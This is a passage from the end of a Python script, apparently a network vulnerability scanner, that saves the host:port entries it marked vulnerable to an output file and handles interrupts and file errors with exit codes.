                f.write(f"\n")
                for result in vulnerable:
                    f.write(f"{result.host}:{result.port}\n")
            logger.info("Results Saved to: %s", args.output)
        except KeyboardInterrupt:
            sys.stderr.write("\r\033[K")
            sys.stderr.flush()
            logger.warning("Output Interrupted")
            return 130
        except OSError as exc:
            logger.error("Failed to Save Results: %s", exc)

    if not completed_successfully:
        return 130

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except KeyboardInterrupt:
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()
        print("\nInterrupted by User")
        sys.exit(130)
